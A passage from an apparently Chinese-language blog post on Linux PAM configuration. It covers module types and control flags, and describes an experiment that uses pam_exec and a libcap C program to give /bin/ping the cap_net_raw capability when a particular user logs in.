相应服务指定模块类型</li></ol><table><thead><tr><th>模块类型</th><th>说明</th></tr></thead><tbody><tr><td>auth(验证模块)</td><td>用于验证用户或设置&#x2F;销毁凭证</td></tr><tr><td>account(帐户管理模块)</td><td>将执行与访问、帐户及凭证有效期、密码限制&#x2F;规则等有关的操作</td></tr><tr><td>session(会话管理模块)</td><td>定义用户登录前的,及用户退出后所要进行的操作.如:登录连接信息,用户数据的打开与关闭,挂载文件系统等</td></tr><tr><td>passwd(密码管理模块)</td><td>将执行与密码更改&#x2F;更新有关的操作</td></tr></tbody></table><ol start="2"><li>control_flag 将指定模块的堆栈行为，配置文件中列出模块被调用的顺序</li></ol><table><thead><tr><th>控制标记</th><th>说明</th></tr></thead><tbody><tr><td>required</td><td>堆栈中的所有 required 模块必须看作一个成功的结果。如果一个或多个 required 模块失败，则实现堆栈中的所有 required 模块，但是将返回第一个错误</td></tr><tr><td>requisite</td><td>如果本模块没有被满足，那本次认证一定失败，而且整个栈立即中止并返回错误信号</td></tr><tr><td>sufficient</td><td>如果标记为 sufficient 的模块成功并且先前没有 required 或 sufficient 模块失败，则忽略堆栈中的所有其余模块并返回成功</td></tr><tr><td>optional</td><td>如果堆栈中没有一个模块是 required 并且没有任何一个 sufficient 模块成功，则服务&#x2F;应用程序至少要有一个 optional 模块成功</td></tr><tr><td>include</td><td>包含其他规则（服务），文件嵌套，可以互相调用，如：login，auth，system-auth等</td></tr><tr><td>[value1&#x3D;action1  value2&#x3D;action2 ….]</td><td>六种动作：ok ，done，bad，die，ignore，reset。</td></tr></tbody></table><p>​        Example：auth [user_unknown&#x3D;ignore success&#x3D;ok ignore&#x3D;ignore default&#x3D;bad] pam_securetty.so</p><ol start="3"><li><code>module_path</code> 将指定实现模块的库对象的路径名称。默认情况下，它将被设为 <code>/lib/security</code>。        <img src="/libpam.png" alt="libpam"></li><li>module_options&#x2F;module_args（可选字段）将指定可以传递给服务模块的选项或实参。</li></ol><hr><p>实验：配置用户<code>userping</code> ，设置<code>cap_net_raw</code> 权能。</p><ul><li>添加用户<code>userping</code>  :  <code>sudo adduser userping</code> </li><li>查看并清除<code>/bin/ping</code> 的权能：</li></ul><p><img src="/%E9%80%89%E5%8C%BA_057.png" alt="选区_057"></p><ul><li>切换到用户<code>userping</code> 再<code>ping</code> 无法<code>ping</code>   : <code>su userping</code> </li><li><code>userping</code> 登录时给<code>/bin/ping</code> 添加权能：</li></ul><pre class="line-numbers language-shell"><code class="language-shell">###################################################### File Name: ping_cap.sh# Author: xsyin# mail: shouyinXu@163.com# Created Time: 2018年04月30日 星期一 16时05分57秒#####################################################!/bin/sh[ "$PAM_TYPE" == "open_session" ] || exit 0if [ "$PAM_USER" == "userping" ]; then    setcap cap_net_raw=eip /bin/ping    echo "SUCCESS"else    echo "FAILURE"fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将<code>ping_cap.sh</code> 移动到 <code>/usr/local/bin</code> 路径下，并设置为可执行：</li></ul><pre class="line-numbers language-text"><code class="language-text">sudo chmod u+x /usr/loca/bin/ping_cap.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>所有登录都使用<code>common-session</code> 模块：</li></ul><p><img src="/%E9%80%89%E5%8C%BA_058.png" alt="选区_058"></p><p>因此在<code>common-session</code> 模块中添加规则: </p><pre><code>session  optional  pam_exec.so debug log=/tmp/pam_exec.log seteuid /usr/local/bin/ping_cap.sh</code></pre><p>必须模块，开启了<code>debug</code>模式，用户<code>userping</code> 每次登录会执行<code>ping_cap.sh</code></p><ul><li>切换到<code>userping</code> 用户：</li></ul><p><img src="/%E9%80%89%E5%8C%BA_059.png" alt="选区_059"></p><p>出错多次，最终调试成功：</p><p><img src="/%E9%80%89%E5%8C%BA_061.png" alt="选区_060"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>优点：<code>userping</code> 用户无法执行特权命令，通过<code>pam</code> 可赋予一些特权操作。</p><p>缺点：本实验中修改了<code>ping</code> 的文件权能，影响了其他用户。退出<code>userping</code> 后，<code>ping</code> 命令变成有效了。</p><p>过渡C版本：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*************************************************************************    > File Name: ping_cap.c    > Author: xsyin    > Mail: shouyinXu@163.com     > Created Time: 2018年04月30日 星期一 14时56分35秒    > Make: gcc ping_cap.c -lcap -o ping_cap ************************************************************************/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/capability.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token macro property">#<span class="token directive keyword">undef</span> _POSIX_SOURCE</span><span class="token keyword">extern</span> <span class="token keyword">int</span> errno<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path_p <span class="token operator">=</span> <span class="token string">"/bin/ping"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">listCaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    cap_t caps <span class="token operator">=</span> <span class="token function">cap_get_file</span><span class="token punctuation">(</span>path_p<span class="token punctuation">)</span><span class="token punctuation">;</span>    ssize_t y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The file %s was give capabilities %s\n"</span><span class="token punctuation">,</span>path_p<span class="token punctuation">,</span> <span class="token function">cap_to_text</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span> <span class="token operator">&amp;</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_free</span><span class="token punctuation">(</span>caps<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    uid_t uid <span class="token operator">=</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>uid <span class="token operator">!=</span> <span class="token number">1000</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"uid:%d\n"</span><span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">;</span>        cap_value_t cap_values<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>CAP_NET_RAW<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    cap_t caps <span class="token operator">=</span> <span class="token function">cap_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span>CAP_PERMITTED<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>cap_values<span class="token punctuation">,</span>CAP_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span>CAP_EFFECTIVE<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>cap_values<span class="token punctuation">,</span>CAP_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_flag</span><span class="token punctuation">(</span>caps<span class="token punctuation">,</span>CAP_INHERITABLE<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>cap_values<span class="token punctuation">,</span>CAP_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">cap_set_file</span><span class="token punctuation">(</span>path_p<span class="token punctuation">,</span>caps<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"cap_set_file() ERROR: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_free</span><span class="token punctuation">(</span>caps<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">listCaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>缺陷：未搞清楚如何获取PAM正在授权的用户，无法判断切换至<code>userping</code> 用户时设置权能。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux capability </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
